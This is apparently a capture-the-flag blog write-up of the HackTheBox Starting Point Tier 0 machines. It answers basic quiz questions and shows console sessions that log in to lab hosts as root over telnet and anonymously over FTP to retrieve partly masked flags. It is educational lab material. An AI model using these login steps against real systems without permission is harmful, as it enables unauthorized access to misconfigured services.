---
title: Starting Point Tier 0 HTB
author: lazy29t
date: 2023-02-07 20:53:00 +0800
categories: [HackTheBox, StartPoint]
tags: [Discovery, tools, HTB, telnet]
permalink: /HackTheBox/Starting-Point/tier-0
math: true
mermaid: true
---


## Meow Machine
### Telnet


### Questions
What does the acronym VM stand for? 

```yaml
 Virtual Machine 
```

  
---
Now We are to trying to connect **Telnet** `port 23` with the nexts commands 
```console
$ telnet 10.129.53.52
Trying 10.129.53.52...
Connected to 10.129.53.52.
```

 
```console

Escape character is '^]'.
root
....
  █  █         ▐▌     ▄█▄ █          ▄▄▄▄
  █▄▄█ ▀▀█ █▀▀ ▐▌▄▀    █  █▀█ █▀█    █▌▄█ ▄▀▀▄ ▀▄▀
  █  █ █▄█ █▄▄ ▐█▀▄    █  █ █ █▄▄    █▌▄█ ▀▄▄▀ █▀█


Meow login: root
....
root@Meow:~#
```
```console
root@Meow:~# ls 
flag.txt  snap
root@Meow:~# cat flag.txt
j89************o
```

## Fawn Machine
### FTP Services

In this case we are responses the questiosn about this service:

**What does the 3-letter acronym FTP stand for?**

```yaml
File Transfer Protocol
```
> That [Web](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp) can help you with some information

**Which port does the FTP service listen on usually?**

```yaml
Port 21 
```
**What acronym is used for the secure version of FTP? **
```yaml
SFTP (S F T P) 
```
**From your scans, what version is FTP running on the target? **

```yaml
nc -vn 10.129.157.27  21
....
vsFTPd 3.0.3
```

```console
$ftp 10.129.157.27
Connected to 10.129.157.27.
220 (vsFTPd 3.0.3)
Name (10.129.157.27:lazy29t): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

```console
ftp> ls
229 Entering Extended Passive Mode (|||26254|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> cat flag.txt
```

```console
ftp>get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||64477|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |***********************************|    32      183.82 KiB/s    00:00 ETA
226 Transfer complete.
```

```console
~/Desktop/HTB/StartPoint$ ls
flag.txt
~/Desktop/HTB/StartPoint$ cat flag.txt
4g5**************e
```
